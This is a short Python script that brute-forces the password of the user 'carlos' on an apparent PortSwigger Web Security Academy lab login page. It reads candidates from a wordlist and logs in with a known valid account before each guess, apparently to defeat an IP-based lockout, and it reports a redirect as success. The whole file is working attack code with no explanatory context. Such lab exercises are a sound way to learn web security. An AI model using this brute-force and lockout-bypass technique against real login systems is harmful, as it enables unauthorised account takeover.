import requests


TARGET_URL = "https://0a981fef2cf005f00c1.web-security-academy.net/login"
VALID_USERNAME = "wiener"
VALID_PASSWORD = "peter"
TARGET_USERNAME = "carlos"
PASSWORD_PATH="/PortSwigger/password.txt"

with open(PASSWORD_PATH,'r') as f:

    passwords=f.readlines()
    passwords=[line.strip()for line in passwords]


def login(username, password):
    data = {
        "username": username,
        "password": password
    }
    res = requests.session().post(TARGET_URL, data=data, allow_redirects=False)
    return res

for pwd in passwords:
    login(VALID_USERNAME, VALID_PASSWORD)
    
    res = login(TARGET_USERNAME, pwd)

    if res.status_code == 302:
        print(f"\n\n\t\t[✓] Found password for {TARGET_USERNAME}: {pwd}")
        break
    elif res.status_code == 200:
        print(f"[-] Incorrect password: '{pwd}' \tfor {TARGET_USERNAME}")
    else:
        print(f"[?] Got unexpected status code: {res.status_code}")
